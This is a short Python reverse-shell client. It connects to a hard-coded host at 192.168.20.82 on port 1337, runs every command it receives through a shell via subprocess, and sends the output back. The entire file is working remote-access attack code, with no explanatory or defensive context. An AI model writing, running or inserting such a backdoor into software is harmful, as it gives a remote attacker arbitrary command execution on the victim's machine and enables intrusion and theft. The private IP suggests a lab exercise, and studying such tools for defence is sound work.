import socket
import subprocess

REMOTE_HOST = '192.168.20.82'
REMOTE_PORT = 1337
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)